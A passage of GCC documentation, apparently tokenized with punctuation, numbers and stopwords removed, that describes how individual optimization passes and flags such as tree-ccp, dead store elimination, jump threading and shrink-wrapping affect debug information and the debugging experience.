osexpensiveoptimizationspassstrengthreduction passpostreload passpostreloadcse passpostreloadcse osexpensiveoptimizationspassstrengthreduction passsplitafterreload passsplitafterreload ogpasssplitafterreload passree passcompareelimafterreload passcompareelimafterreload ogcompareelim passthreadprologueandepilogue passthreadprologueandepilogue see og ogpassjump shrinkwrap ogshrinkwrap ogdse passstackadjustments passstackadjustments ogcombinestackadjustments see crossjumping oscrossjumping passduplicatecomputedgotos passduplicatecomputedgotos osexpensiveoptimizationspassduplicatecomputedgotos passschedfusion passifafterreload passifafterreload passregrename passcprophardreg passcprophardreg ogcpropregisters passfastrtldce passfastrtldce ogdce fast see also og ogpassfastrtldce passreorderblocks passreorderblocks ogreorderblocks see also reorderblocksalgorithmstc passleafregs passstackregs passsplitbeforeregstack passsplitbeforeregstack ogpasssplitafterreload passstackregsrun passlatecompilation passcomputealignments passcomputealignments see alignloops osalignloops alignjumps osalignjumps alignlabels osalignlabels alignfunctions osalignfunctions passvariabletracking passvariabletracking ogpassvariabletracking passfreecfg passmachinereorg passcleanupbarriers passdelayslots passdelayslots ogdelayedbranch passsplitforshortenbranches passconverttoehregionranges passshortenbranches passshortenbranches see og ogpassshortenbranches passsetnothrowfunctionflags passfinal passfinal see og ogpassfinal peephole ogpeephole ipara osipara passdffinish passcleanstate build gimplify optimization program parsed build ogbuild tree representation gimplified oggimplify todocleanupcfg todorebuildalias todoremoveunusedlocals optimization pass run cleanup pass todocleanupcfg ogtodocleanupcfg todorebuildalias todoremoveunusedlocals ogtodoremoveunusedlocals strictaliasing varasm fastmath flag affect many pass mention strictaliasing osstrictaliasing mergeconstants ogmergeconstants fastmath ofastfastmath associated optimization pas reorderfunctions osreorderfunctions disable optimization flag set optimization level base level golden standard debugging experience level compared automatic variable parameter allocated memory loaded modified stored back every use branch label preserved block duplicated function inlined except mandatory inlines eg function marked attribute alwaysinline source location preserved branch return cfg edge materialized nops og og debug perform fast optimization low impact debugging flag set optimization level limited option better debugging disables number optimization even would otherwise enabled optimization level ogbuild build build optimization enables selection local dynamic tl model access threadlocal variable known defined dynamic module compiled without global dynamic tl model used instead change effect debugging type conversion attempt substitute conversion float result standard call return double call return float likewise conversion integral type result standard call return double eg round logb converted call return integral type lround ilogb affect debugging inasmuch behavior substituted function inspected oggimplify gimplify gimplify small change processing nested function enable frame structs static chain optimized away without impact debugging representing variablelength array nested function may lose detail type ogpassexpandomp passexpandomp passexpandomp passexpandompssa passexpandompssa openmp primitive may also simplified optimization enabled internal implementation detail nt affect debugging ogpasslowereh passlowereh passlowereh gimple eh lowering decision change optimization finally region may duplicated either way minor effect debugging different code address source code line ogpasssplitcritedges passsplitcritedges passsplitcritedges passcleanupeh passcleanupeh critical edge also split ease optimization later unsplit remain ogpassipainline passipainline passipainline optimization affect slightly way variable parameter remapped inlining change effect debug information masked away ogtodocleanupcfg todocleanupcfg todocleanupcfg optimizing various pass run cleanup control flow graph may delete unreachable block trivially dead insns like unused set copy self gimple mode removal unreachable block may propagate ssa defs us hard imagine us thereof reachable impact debugging removed block may missed debugging breakpoints ca nt set removed block cleanup may renumber basic block detect forwarder block remove unused label fallthrough forwarder block merge block unconditional fallthrough replace jump return jump copy target simplify conditional jump remove singledestination jump removal fallthrough forwarder block may discard debug bind marker could make singlestepping breaking source location represented removed marker impossible bind might also lost though least gimple often redundant bind confluence point shortly thereafter similar negative effect arises jump replaced return another jump bypassing debug marker bind original target block optimizing nops would materialize cfg edge source location inserted extra step preserve source location gimplification jump label taken corresponding debug marker also dropped may remove possibility stopping goto ogtodoremoveunusedlocals todoremoveunusedlocals todoremoveunusedlocals optimization enables unused local variable lexical block released early may cause variable scope ever entered omitted altogether debug information ogpassreturnslot passreturnslot passreturnslot optimization enables named return value pas detects function return aggregate type memory always returning local variable unifies variable result using name source location variable mapping us variable result may effect debugging variable happens taken inlined function case source name location mapping skipped would introduce name present original function variable still remapped return declaration source location variable declaration lost ogpasscsesincos passcsesincos passcsesincos optimization enables pas combine call sin co cexpi ssa operand single dominating cexpi call taking real imaginary part result former sin co call pas also attempt simplify pow powi cab call none affect debugging aside ability step affected math function call ogpassfoldbuiltins passfoldbuiltins passfoldbuiltins optimization pas simplifies memcpy memset copiedfrom range known zero stdarg call simple pointer operation valist simple pointer type similar transformation affect debugging aside stepping breaking simplified function ogpasslowervector passlowervector passlowervector passlowervectorssa passlowervectorssa optimization enables attempt optimize divide modulus operation vector integral type combination vector multiply shift add also enables attempt optimize initialization vector avoid piecewise initialization none affect debugging ogpassexpand passexpand passexpand enabling optimization change deferstackallocation behavior effect debugging limited narrowing live range dead value also enables reordering operation expand requiring operand performed first reordering involve memorymodifying operation debug bind cover affected case affect debugging expand also introduces plenty pseudo optimizing allows replacement common subexpressions whatnot conversely gimplification introduces temporary optimizing attempt reuse temporary optimizing effect debugging limited variation variable location assignment ogpassjump passjump passjump passthreadprologueandepilogue passthreadprologueandepilogue jump proandepilogue rtl pass run cleanupcfg cleanupexpensive given optimize performs expensive block merging simplification conditional jump around jump merging effect debugging indeed could reduce loss debug marker bind done forwarder block whereas simplification might drop marker bind along jump impact debugging similar jump simplification ogpassdfinitializeopt passdfinitializeopt passdfinitializeopt several rtl optimization pass also use dataflow analysis update note unused register definition well death point register debug bind reference register death point unused set detected analysis debug temporary introduced next death point preserve equivalent expression use debug bind generally improves debugging experience enabling bind expression resort equivalence express value bound user variable even register reused another purpose longer hold value ogpasscse passcse passcse first cse common subexpression elimination pas enabled optimizing effect pas described reruncseafterloop osreruncseafterloop third cse pas may activated reruncseafterglobalopts ogpassrtlmoveloopinvariants passrtlmoveloopinvariants passrtlmoveloopinvariants depending selected register allocation model optimization change register pressure cost estimate rtl loop analyzer something change kind optimization made kind impact debugging may ogpassinitializeregs passinitializeregs passinitializeregs optimization enables initregs pas add zeroinitialization pseudo uninitialized us without effect debugging ogpasscombine passcombine passcombine optimization enables combine pas performs arithmetic substitution singleuse pseudoset insns others successful substitution insns become useless removed value still used debug bind bind updated accordingly marker ensure bind effect still visible therefore pas effect debugging ogpassira passira passira also change default register allocation region setting without effect debugging ogpassreload passreload passreload optimization enables reload inheritance removal redundant reload store without effect debugging ogpasssplitafterreload passsplitafterreload passsplitafterreload passsplitbeforeregstack passsplitbeforeregstack additional insn splitting pass enabled reload optimizing without effect debugging impact would brought later splitting pass anyway ogpassfastrtldce passfastrtldce passfastrtldce several rtl optimization pass run fast dead code elimination subpass end live register dataflow analysis long dce enabled see dce fast ogdce fast detail ogpassvariabletracking passvariabletracking passvariabletracking optimization enables variable tracking debug bind marker try mask effect optimization debugging needed without optimization ogpassshortenbranches passshortenbranches passshortenbranches optimizing insn length estimated multiple pass grow length needed may result shorter variant without effect debugging ogpassfinal passfinal passfinal final may discard redundant compare optimizing also link back singleuse label jump use machinespecific transformation sh constant pool placement transformation effect debugging ogtreeccp treeccp passccp passccp enable ssaccp optimization tree conditional constant propagation attempt determine value condition control conditional branch may simplify fold call assigns constant assignment turn conditional branch unconditional one possibly dropping block become unreachable significant effect debugging experience setting breakpoints certain source code range may become impossible block containing dropped extra folding might make additional line represented instruction sfn provides marker stand vta lvu ensure effect optimizedaway code inspected even without remaining instruction overall impact pas debugging information likely negligible ogtreefre treefre passfre passfre enable full redundancy elimination fre tree pas us value numbering identify remove redundant ssa computation replacing previouslycomputed result also propagating copy removing dead computation folding computation resolving conditional branch indirect call change relevant debugging session would modify variable create situation would nt normally arise runtime substitution folding effect debugging unless variable changed debugger break equivalence stmt removal masked debug bind marker view resolving conditional branch may remove entire block nt reachable begin consequent inability set breakpoints could surprising especially debugging session change variable try force execution unreachable block resolving indirect call direct one might also surprise attempt modify pointer debug session attempting cause different function called ogtreedse treedse passdse passdse enable dead store elimination pas remove store mem call modify memory overwritten without intervening read addressable variable might modified removed stmts tracked debug bind debugging session might confusing expected effect removed dead store observable ogguessbranchprobability guessbranchprobability passprofile passprofile enable guessing branch probability effect debugging per se ogtreech treech passch passch passchvect passchvect enable loop header copying tree pas copy loop header turning copy entry test debug bind copied block also copied postloop block modeling bind introduced phi node entering ssa additional binding duplicating header block impact debugging significantly within copied block one possibly confusing consequence setting breakpoint current program counter singlestepping loop entry test break subsequent iteration viceversa unlikely surprising setting breakpoints line overcomes effect user label would present copy could make confusion provide additional edge loop header actually stop transformation taking place treeloopvectorize enabled another chvect pas activated differs regular ch pas deciding loop undergo header copying pass essentially effect debugging ogtreedce treedce passdce passdce passcddce passcddce enable ssa dead code elimination optimization tree may remove assignment branch even call deemed unuseddead dead assignment propagated debug stmts removal make removal affect debugging dead branch may cause entire block removed making expectation stepping setting breakpoints block debugging impossible meet pure const call well malloc free pair deemed dead may removed frustrating expectation stepping debugging ogipaprofile ipaprofile passipaprofile passipaprofile perform interprocedural profile propagation pas propagates execution frequency caller callees also upon identifying target indirect call execution profile introduces speculative direct call inlined otherwise optimized none affect debugging ogipapureconst ipapureconst passipapureconst passipapureconst passlocalpureconst passlocalpureconst discover pure const function detect mark function whether side effect loop throw propagate information decide caller effect debugging may enable elision call would return value without side effect function explicitly marked pure const elision may slightly confusing debugging function may called hit breakpoints fewer time expected stepping elided call possible ogipareference ipareference passipareference passipareference discover readonly non addressable static variable pas analysis static variable used function propagates gathered information caller used later optimization nt effect debugging ogtreecopyprop treecopyprop passcopyprop passcopyprop enable copy propagation tree pas identifies simplifies expression based copyrelated ssa name may unify multiple variable single location range take equivalent value making impossible modify independently debugger identification equivalence may also resolve conditional branch unconditional one removing entire basic block possibility overriding condition debugger ogtreesink treesink passsinkcode passsinkcode enable ssa code sinking tree pas move statement control flow closer us thereof may profitable remove unused def removed position dominates debug bind bind adjusted masking effect debugging least far scalar concerned addressable variable subject value tracking debug bind delaying store may actually observable debugging ogtreeslsr treeslsr passstrengthreduction passstrengthreduction perform straightline strength reduction pas replaces computation involving multiplies one involving add case introducing additional temporary end trackable variable end getting value computed different way affect debugging ogtreecoalescevars treecoalescevars passexpand passexpand enable ssa coalescing user variable flag allows compiler assign single pseudoregister ssa version originally created different user variable aid debug bind little effect debugging impact limited early loss value expected overwritten eg earlier value variable already dead location holding overwritten value computed temporary another variable copied former variable computation point binding point attempting inspect variable may indicate optimized point perfectly accurate undesirable debugging perspective ogtreeter treeter passexpand passexpand replace temporary expression ssa normal pas substitute singlyused ssa defs single nondebug us expand larger expression select insns debug bind may end complex expression needed bound actual computation larger expression take place affect debugging ogdeferpop deferpop passexpand passexpand defer popping function args stack later effect debugging ogsplitwidetypes splitwidetypes passlowersubreg passlowersubreg split wide type independent register flag enables two rtl lowering pass explode widemode pseudo multiple wordmode one many case modifies insns place occasionally emits multiple insns replace single one case affect debugging splitting may performed user variable although represent variable location independent location different fragment wide variable always get debug bind assignment tracking throughout compilation location inference decls associated regs mem used fragment variable instead correctly identify location necessarily point program reflect recommended inspection point may cause debugging session observe change variable early late make debugging confusing adding debug bind fragment arranging gcc aggregate back might get accurate information since would done late stage possible bind would introduced point satisfy usual expectation side effect would take place marker immediately assignment also issue dismembered aggregate mentioned treesra would likely affect split variable well ogforwardpropagate forwardpropagate passrtlfwprop passrtlfwprop passrtlfwpropaddr passrtlfwpropaddr perform forward propagation pas rtl rtl pass replace us pseudo single reaching definition impact debugging pseudo propagated us become unused substituted debug bind well unused def might end preserved debug temp possibility propagating pseudo becomes dead earlier register allocation debug bind referenced still set end finding register reused purpose earlier without transformation since propagation found source definition available way propagation point equivalence propagated pseudo definition noted variable tracking machinery definition point likely alternate expression register value found ogdse dse use rtl dead store elimination pas flag enabled default activated optimizing rtl pass enabled remove store memory overwritten without intervening read store value previous store write value stack read function return since affect addressable variable global local debug bind apply effect removing store going noticeable debugging except redundant store ogautoincdec autoincdec passincdec passincdec generate autoincdec instruction flag enabled default activated optimizing target architecture support auto inc auto dec addressing mode detects insns add subtract constant pseudo pseudo pseudo copy thereof used memory reference attempt turn memory address pre postinc dec mod addressing mode may cause one pseudo change earlier later expected although done pseudo otherwise used original modified modification insns debug bind adjusted bind wrong value pseudo modified even incorrect location may lost ogirasharesaveslots irasharesaveslots passira passira share slot saving different hard register flag enabled default activated optimizing allows register whose lifetime overlap saved slot across call could shorten apparent live range variable making unavailable spot might absence flag ogomitframepointer omitframepointer passira passira possible generate stack frame flag attempt avoid reserving using register frame pointer using stack pointerrelative address needed frame pointer register used essential debugging call frame information obviated irrelevant purpose optimization effect debugging ogcompareelim compareelim passcompareelimafterreload passcompareelimafterreload perform comparison elimination register allocation finished pas remove redundant compare insns relying insns set flag side effect instead effect debugging ogshrinkwrap shrinkwrap passthreadprologueandepilogue passthreadprologueandepilogue emit function prologue part function need rather top function pas attempt insert prologue sequence later point entry point may involve duplicating block moving nonprologue early insns block moved insns simple enough debug bind adjusted mask move affect debugging block duplication little impact debugging though breakpoints set based code address rather logical location may notice difference later prologue may confuse debugger assume end epilogue noted debug information mark beginning user code debugger likely significantly affected optimization ogcombinestackadjustments combinestackadjustments passstackadjustments passstackadjustments look opportunity reduce stack adjustment stack reference flag consolidates consecutive stack allocation consecutive stack deallocations deallocations followed allocation within single block adjusting stack pointerrelative address needed effect debugging ogcpropregisters cpropregisters passcprophardreg passcprophardreg perform register copypropagation optimization pas pas replaces pseudo assigned hard regs setsrcs earlierdefined equivalent value remove noop move substitution made debug bind insns aside noop move stood source line nonsfn setting nt affect debugging experience way ogdce fast dce fast passfastrtldce passfastrtldce use rtl dead code elimination pas flag enabled default fast rtldce pas activated optimizing insns regarded dead set register none live dead set used debug bind preserved debug temp affect debugging ogreorderblocks reorderblocks passreorderblocks passreorderblocks reorder basic block improve code placement reorder block pas attempt increase number fallthrough edge moving basic block may remove possibility breaking explicit goto statement ogdelayedbranch delayedbranch passdelayslots passdelayslots attempt fill delay slot branch instruction pas move insns attempting fill delay slot arch support often call branch jump return run vartracking may move insns across debug bind note would affected potentially confusing location information may create opportunity jump jump redirected ultimate jump target may invalidate breakpoints could set bypassed jump arch call followed jump may delay slot filled insns modify register holding return address call may confuse debugger point call including recovery entrypoint value caller frame location information conditional marker might enable cfg simplification without invalidating breakpoints failing would probably wise disable return address adjustment og og ogpeephole peephole passfinal passfinal enable machine specific peephole optimization flag enabled default activated optimization enabled machine define peephole confused newer handled unlike older peephole recognize sequence insns final pas output assembly code directly debug note insns recognized peephole group moved peephole output keep marker mostly correct may corrupt bind ogmergeconstants mergeconstants varasm varasm attempt merge identical constant across compilation unit flag constant pool entry constant amount object may address taken compared mergeallconstants given requesting even readonly object merged emitted mergeable section linker detect remove duplicate may affect debugging inasmuch addressidentity unified object matter since sounified object usually string literal initializers rather uservisible variable seldom ever affect debugging perform fast optimization option set optimization level passloweromp passloweromp passexpandomp passexpandomp passexpandompssa passexpandompssa og og maximum vectorization factor openmp limited higher targetspecific vector size used instead passmergephi passmergephi basic block containing phi node debug bind marker may dropped altogether mergephi pas dropping marker could make statement impossible stop stepping dropping bind make side effect visible earlier bind seem remain effective might possible move bind marker destination block keep conditionals passtreeifcombine passtreeifcombine pair test guarding conditional block arrangement may combined single test ifcombine pas block holding second test becomes unconditional marker bind take effect even nt optimization enabled block forwarder else block viceversa forwarder block empty except phi node debug bind marker may confuse debugging changing situation forwarder bind marker take effect conditional bind marker may alleviate problem passladdress passladdress laddress pas lower addresstaking operation invariant expose computation involving offset array indexing optimizers effect debugging treebitccp passccp passccp enable ssabitccp optimization tree flag modifies slightly behavior ssa treeccp pas ogtreeccp keep track individual bit ssa register rather entire register allows simplification especially conditional branch based individual bit introduce new kind impact debugging experience may make block unreachable thus unavailable breakpointing assignment reduced reuse constant without additional code treeforwprop passforwprop passforwprop enable forward propagation tree pas enabled default activated higher run time function substitute expression assigned ssa name us thereof folding statement place nt affect debugging transformation made pass load complex type whose real imaginary part used separately broken separate component load debug bind referencing complex value loaded memory reset degrading debug information bind stmt might adjusted instead store complex value also split without effect debugging expression taking address variable possibly adding offset may substituted indirection enabling variable become nonaddressable turned ssa form treephiprop condition conditional branch may folded constant change control flow graph render entire block unreachable likewise simplification switch expression may rule case target may combine memcpy memset call neighbor range single memcpy may affect debugging pointer returned memset call referenced debug bind additional specialized transformation involve bit rotation permutation bitfield ref vector constructor none affect debugging treesra passsraearly passsraearly passsra passsra perform scalar replacement aggregate flag enables pass turn member aggregate would normally live memory standalone scalar optimized like register original aggregate object may case fully taken apart still used whole scalar spilled back place reloaded needed assignment scalar introduced pass well spill reloads debug bind introduced vartracking keep track fragment aggregate pas transparent far debug information concerned unfortunately problem limitation vartracking pas cause u use annotation scalarized member least case aggregate whole small enough regarded ssa register investigation vartracking needed determine use least conflicting note apply whole aggregate scalarized member may turn show significant shortcoming vta variable tracking assignment require work make use available annotation bring debug information quality fully partiallyscalarized aggregate line scalar another notable limitation introduced pas dismembered aggregate longer used inferior call expect reference pointer treeloopim passlim passlim enable loop invariant motion tree although flag enabled default pas omitted set pass activated og og run higher pas move invariant loop performs store motion floatingpoint divide shift bit test may invariant divisor shifted bit rearranged hoisting without impact debugging access memory invariant address may turned ssa scalar load loop entry store loop exit early load delayed store may confusing debugging invariant computation moved edge loop preheader removed original position removal trigger propagation debug bind preserve bind equivalence drop actual location becomes fragile bit additional effort would possible keep bind unchanged still movement little impact debugging treedominatoropts passdominator passdominator passphionlycprop passphionlycprop passuncprop passuncprop enable dominator optimization although flag enabled even og og pass controlled omitted set pass activated og og run propagates constant copy us fold expression attempt resolve conditionals eliminates redundant computation redundant store replaces inequality equality test propagates coalescible ssa name equivalent phi value incoming edge propagates remove degenerate phi performs jump threading transformation significant effect debug experience given vta sfn lvu mask effect others jump threading see effect gimple jump threading treevrp ostreevrppassthreadjumps inlinefunctionscalledonce passipainline passipainline integrate function required single caller option work enabler certain case inlining option disabled optimization disabled function caller flag attribute mandate enables inlining possibility inlining caller emitting outofline copy even considered oddly called single caller bit seems leftover artifact earlier implementation nt seem test involving caller count inlining code path activated flag inline substitution per se usually significant source debug information degradation piece debug information could represented line function equally represented inlined copy potential loss arises debuglossy optimization performing transformation enabled strengthened additional information available analyzing caller callee single context example inline expansion function within loop unrolled may face significant ambiguity many inlined copy function far scope copy extend especially instruction different iteration shuffled together eg modulo scheduling another situation inlining may affect debug experience significantly heavy use abstraction call large number nearly empty abstractiononly function inlined density code v debug annotation becomes low risk hitting upper limit debug annotation count grows hit annotation debug marker bind may dropped removing compiler ability mask effect optimization debugging loss marker remove linearity singlestepping robustness relationship source location program observable effect bring loss debug bind take much possibility observing variable held stable memory location degradation take debug information back day debugging optimized program reasonably held unreasonably difficult may sometimes avoided expense significant compile time memory using parameter maxdebugmarkercount maxvartracksize maxvartrackexprdepth maxvartrackreverseopsize ssabackprop passbackprop passbackprop enable backward propagation use property ssa level flag enabled default pas activated higher detects numeric variable whose sign matter optimizes away operation affect sign debug bind referencing modified ssa defs adjusted possible since case involve function call belong debug bind bind may lost others especially phi node may bound expression sign reversed may confusing treephiprop passphiprop passphiprop enable hoisting load conditional pointer pas enabled default activated higher replaces phi node whose incoming args take address scalar value later dereferenced phi node take scalar value directly pas make sure loaded memory value change load point original optimized transformation might affect debugging involves modifying affected memory variable value may already loaded may also cause variable addressable become nonaddressable promoted ssa register debug bind would assigned time promotion may late capture assignment might already moved optimized result variable promoted nonaddressable worse location tracking scalar variable never address taken worse remained addressable way treepta passbuildalias passbuildalias passbuildealias passbuildealias todorebuildalias todorebuildalias perform functionlocal pointsto analysis tree computes refined alias set nt make transformation whatever effect might debugging experience indirect stdargopt passstdarg passstdarg optimize amount stdarg register saved stack start function code enabled flag estimate maximum size generalpurpose floatingpoint register area used stdarg variable argument list function limit number register need saved affect debugging treebuiltincalldce passcallcdce passcallcdce enable conditional dead code elimination builtin call although flag enabled even og og pas omitted set pass activated og og run pas replaces builtin call simpler operation andor guard operation condition decide whether execute call replaced may slightly confusing setting breakpoints omitted call attempting singlestep treecselim passcselim passcselim transform condition store unconditional one flag enabled default conditional move instruction pas activated higher pas move gimple store conditional block subsequent join block introducing phi node select value stored addressable variable rely vartracking mem annotation rather vartrackingatassignments debug bind moving store cause observable change debug experience variable modified store inspected expected store point replacement store executed outdated value found wonder might possible insert debug bind temporarily override location variable live memory lifetime deferred writes could reflected location list observed immediately bind spite deferred execution store hoistadjacentloads oshoistadjacentloads move could leave conditional block empty could make impossible set breakpoints line within singlestep sfns get dropped along removed block unlike combined store ifthenelse structure sunk store elseless block else block empty block retain location information one might able stop even conditional block executed include line get confusing could alleviated conditional bind marker ssaphiopt passphiopt passphiopt optimize conditional pattern using ssa phi node pas performs various transformation see hoistadjacentloads oshoistadjacentloads may drop small empty conditional block combining test conditional assignment represented phi node flagstore ab min max expr temporary needed may cloned phi result placed one operand original phi node debug bind referencing original result remain correctly unchanged potential negative impact debug experience transformation limited removal conditional block diminished ability step block set breakpoints potential early temporary overwrite location variable eventually hold join value might make variable impossible inspect modify overwrite minmax case change picture much except possibility loss visibility result intermediate assignment bind marker removed along conditional block another situation conditional block may eliminated edge condition yield value phi eg x x simplifies simple case value unification usual impact removing conditional block elaborate case multiple assignment computing result conditional block assignment marker bind moved conditional block usual consequence difficulty stepping removed block inspect result computation whose debug bind dropped debug bind subsequent join point yet another transformation factoring conversion phi node incoming edge perform conversion one constant moving conversion join still found potentially profitable enabling optimization new phi introduced type value prior conversion original conversion removed new conversion stmt introduced top join block storing original phi result finally original phi def removed transformation remove block original conversion propagated debug bind new conversion without location information inserted debug bind original phi node final removal original phi node reset debug bind skip propagation bind upon phi node removal conversion assignment becomes new definition moved conversion still inspected thanks sfn vta converted value bound variable take value join point transformation affect debug experience treereassoc passreassoc passreassoc enable reassociation tree level although flag enabled default pas omitted set pass activated og og run higher patch rearranges multiple stmts perform operation say addition ordering operand rank issuing multiple operation parallel advantageous end removing nearly original stmts issuing new one using new ssa name debug bind retain original operation marker allow inspected singlestepping reassociation might insert extraneous call however eg turning repeated multiplies powi call might slightly confusing stepping call range test conditional branch may end simplified making branch unconditional rendering block unreachable prevents setting breakpoints treeloopoptimize passfixloops passfixloops passtreeloop passtreeloop passtreenoloop passtreenoloop enable loop optimization tree level flag enabled default activated optimization higher enabled activated flag enables pas detects loop gather information flag activated loop found function various loop pass run function otherwise pas enabled treeslpvectorize treescevcprop passscevcprop passscevcprop enable copy propagation scalarevolution information flag enabled default activated treeloopoptimize activated scalar evolution determines phi node invariant replace us thereof including debug bind invariant effect debugging also computes scalar evolution final value variable modified loop dropping phi node favor computation based value known loop entered may affect debugging removal phi node reset debug bind referencing bind could preserved since new equivalent definition introduced treeloopivcanon passivcanon passivcanon passcompleteunroll passcompleteunroll passcompleteunrolli passcompleteunrolli create canonical induction variable loop flag enabled default activated treeloopoptimize activated pas estimate number iteration loop identifies exit edge remove whose condition never met based gathered information maximum number iteration attempt complete loop unrolling completes succeeds otherwise loop meet certain condition countdown induction variable introduced loop exit test replaced compare variable zero transformation minimally impact debugging removal loop exit may render unreachable block unavailable setting breakpoints would never hit loop unrolling us machinery effect debugging loop peeling see peelloops ivopts passivoptimize passivoptimize optimize induction variable tree flag enabled default activated treeloopoptimize activated loop detecting base general induction variable selecting optimal set new artificial induction variable created added loop us induction variable chosen optimal set rewritten term optimal set adjusting original assignment inserting new assignment instead phi node finally assignment induction variable set removed propagated debug bind needed discarded ala propagation debug bind may lose plenty useful information phi node propagated bind regular assignment removed say definition used definition b removed get chance propagate b debug bind referenced b happen remove first us b debug bind end reset losing relevant location information inlineatomics passfoldbuiltins passfoldbuiltins inline atomic operation lock free instruction sequence available flag enabled default transformation described herein part fold builtins pas activated higher various atomic operation turned atomic bit test set complement reset transformation may invalidate user variable used compare zero ifconversion passrtlifcvt passrtlifcvt passifaftercombine passifaftercombine perform conversion conditional jump branchless equivalent various situation rtl pas remove test conditional branch basic block make surprising singlestepping block guarded condition line would expected run given condition actually get run viceversa sfns nt help reinforce whatever block execution taken get dropped altogether aside confusing singlestepping block removal might likely nt cause gcc lose track debug binding theory confluence point entering ssa introduce additional debug bind allow gcc recover loss binding separate branch allow gcc get back sync result ifconverted assignment confluence point least confluence point binding recovered ifconverted set inserted confluencerecovering debug bind transformation usually apply single assignment conditional block support turning multiple assignment block multiple assignment ifthenelse cond thenvalue origvalue nt debugging complication case block much longer breaking user expectation single stepping longer sfn might make worse statement marker conditional block actually dropped nt get step block support conditional marker bind could alleviate effect transformation moveloopinvariants passrtlmoveloopinvariants passrtlmoveloopinvariants move loop invariant computation loop pas identifies set insns invariant within loop move loop preheader possibly using new pseudo hold invariant replaces copy pseudo holding equivalent invariant debug bind remain place need adjusted transformation ensure value available original pseudo point right original set bind tend risk see debuggability moved insns insns leading equivalence may end dead removed later pass may leave line code without insns standing use sfn lvu information debugger enabling stop inspect state even line remove potential problem branchcountreg passrtldoloop passrtldoloop replace add compare branch branch count register pas replaces conditional branch end loop single decrementcounterandconditionallyloop sequence loop iteration count computed original loop counter removed pas pas affect debug information however original loop counter may become unused optimized away unlikely generic adjustment debug bind statement able realize computed newlyintroduced loop counter room improvement adjusting debug bind original loop counter term new related iv might require additional infrastructure could likely generalized used iv general passifafterreload passifafterreload perform conversion conditional jump conditional execution pas turn insns else block condexec enabled condition negation else removing conditional branch branch end conditional block bringing single basic block modify remove debug insns singlestepping enter execute block though side effect insns whose condition active executed general insns modify variable followed debug insn bind variable location holding modified value although debug insns nt conditional bind location variable often always remains across modification case nt bind confluence conditional block get variable location value back sync addition postconfluence point variable modified within block turned conditionallyexecuted insns also correctly inspected right active assignment ie conditional assignment would executed conditional block remained separate sfn lvu technology help make sure usable inspection point correct binding point point combined block variable potentially modified may regarded bound stale unused location holding unrelated uninitialized value corresponding would assigned variable block get confusing one realize block apparently executed one corresponding guarding condition caveat conditional execution apply somewhat unusual case location variable actually change control flow confluence variable value unification point regardless debug bind confluence point often case variable life register memory location throughout conditionally executed block degradation debugging experience pas although possible rare debug bind marker currently marked conditional making possible could alleviate impact transformation o o size perform optimization tend reduce code size option set optimization level mode assigns higher priority reducing code size optimization level higher extends test whether memory reference may overlap affine combination analysis may infer nonaliasing case lower optimization level would nt enabling optimization nothing effect debugging could nt obvious case nonaliasing ospasscompleteunrolli passcompleteunrolli passcompleteunrolli optimization level higher enables pas completely unrolls inner loop iterate time unrolling us machinery performs loop peeling see peelloops affect debugging ospassearlyremat passearlyremat passearlyremat early rematerialization pas run optimization level higher rematerializes pseudo whose live range cross call copying reaching definition insns call us pseudo may regarded dead call might reset bind new death point even could adjusted refer definition used rematerialization case however expression may lost entirely even preserved might complex recognized unchanged pseudo rematerialized location value based pseudo might lost ospassira passira passira optimizing size change default register allocation region setting back one used optimizing osexpensiveoptimizations expensiveoptimizations perform number minor expensive optimization osexpensiveoptimizationspassthreadjumps passthreadjumps passthreadjumps gimple jump threading one significant transformation enabled flag see effect jump threading debugging treevrp ostreevrppassthreadjumps osexpensiveoptimizationspassoptimizebswap passoptimizebswap passoptimizebswap bswap gimple pas also enabled expensive optimization recognizes shift rotates equivalent byteswap transformation replaces byteswap builtin uservisible intermediate computation debug bind statement ultimately adjusted preserved even computation dropped stmt moving replacing insertingthenremoving might actually mess debug bind tracking final value osexpensiveoptimizationspassoptimizewideningmul passoptimizewideningmul passoptimizewideningmul another expensive optimization pas wideningmul recognizes various opportunity math optimization fusing multiply add testing overflow add subtracts combining divide modulus single operation final assignment stmts replaced stmts performing longer needed computation removed way nt harm debugging osexpensiveoptimizationspassstrengthreduction passstrengthreduction passstrengthreduction passexpand passexpand passcombine passcombine passcse passcse passira passira passreload passreload passpostreloadcse passpostreloadcse change brought flag additional canonicalization address comparing base address alias analysis searching alternate base address gimple strength reduction loop iteration count estimation even loop multiple exit taking conflict count account ordering ssa name coalescing combination temporary slot automatic variable reuse widermode ands mem cse simplification cheap extension combine slightly elaborate selection register class preference attempt decrease number live range integrated register allocator removal unneeded reloads additional postreload combine cse subpasses none modify pass way impact debugging nt similarly impacted without flag osexpensiveoptimizationspassduplicatecomputedgotos passduplicatecomputedgotos passduplicatecomputedgotos another expensive optimization compgotos rtl pas duplicate smallenough block ending computed jump merges copy predecessor single successor effect debugging osstrictaliasing strictaliasing strictaliasing strictaliasing assume strict aliasing rule apply flag limit case pointer access may alias enable kind transformation impact debugging could incurred otherwise using pointer known alias mean osvectcostmodelcheap vectcostmodelcheap passvectorize passvectorize passslpvectorize passslpvectorize use cheap cost model vectorization affect treeloopvectorize treeslpvectorize decision kind transformation make ostreevrp treevrp passearlyvrp passearlyvrp passvrp passvrp perform value range propagation tree flag activates two different pass early vrp vrp proper early vrp simpler iterative going basic block dominance order rather using ssa propagation engine range assigned ssa name narrowed single constant subsequent statement referencing name propagated possibly folded definition may removed conditional statement may simplified removing edge basic block expression statement may also simplified based range simplification affect significantly debugging experience removed definition mentioned debug bind propagated preserved marker view enabling singlestepped inspected otherwise simplified statement remain place output nt require debug information change simplified condition may cause entire block become unreachable removed would stop placing breakpoints breakpoints would nt reached anyway ostreevrppassthreadjumps passthreadjumps passthreadjumps end vrp proper gimple jump threading take place using value range simplify conditional stmts tell whether outgoing edge threadable block determined incoming edge gimple jump threading duplicate block arriving certain incoming edge implies exiting certain outgoing edge duplication affect debug experience copied block carry much debug information original block threading however block copied namely forwarding block codegen perspective seem jump another block debug experience perspective however may contain plenty bind statement marker duplicated bind consolidated latest bind variable copied marker dropped entirely arrangement intended reinforce bind newlyintroduced confluence drop debug bind would observable introduction marker view marker view dropping block favor bind consolidation amount significant loss effect need assessed forwarding block leadingtrailing debug stmts may end removed cfg cleanup better mean preserve consolidating forwarding block guarded optimizedout condition may needed conditional marker bind possibility explore ostreedce aggressive treedce aggressive passcddce passcddce see treedce ogtreedce optimization level higher ie starting o o second tree dead code elimination pas run aggressive mode take control dependency account enabling additional conditional branch eliminated however fundamentally change kind effect pass debugging osipasra ipasra passearlyipasra passearlyipasra perform interprocedural reduction aggregate pas modifies argument list function take 